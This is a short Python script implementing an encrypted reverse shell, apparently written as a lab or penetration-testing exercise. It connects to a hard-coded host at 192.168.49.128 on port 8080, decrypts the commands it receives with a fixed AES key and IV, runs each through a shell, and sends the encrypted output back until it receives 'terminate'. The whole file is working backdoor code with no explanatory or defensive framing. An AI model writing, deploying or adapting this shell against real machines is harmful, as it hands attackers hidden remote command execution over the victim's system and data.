from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding
import socket
import subprocess

key = b"H" * 32
IV = b"H" * 16

def encrypt(message):
    encryptor = AES.new(key, AES.MODE_CBC, IV)
    padded_message = Padding.pad(message, 16)
    print(padded_message)
    encrypted_message = encryptor.encrypt(padded_message)
    print(encrypted_message)
    return encrypted_message

def decrypt(cipher):
    decryptor = AES.new(key, AES.MODE_CBC, IV)
    decrypted_padded_message = decryptor.decrypt(cipher)
    decrypted_message = Padding.unpad(decrypted_padded_message, 16)
    return decrypted_message

def connect():
    s = socket.socket()
    s.connect(("192.168.49.128", 8080))
    while True:
        command = decrypt(s.recv(1024))
        print('We received ' + command.decode())
    
        if 'terminate' in command.decode():
            break
        else:
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(encrypt(CMD.stdout.read()))

def main():
    connect()
main()
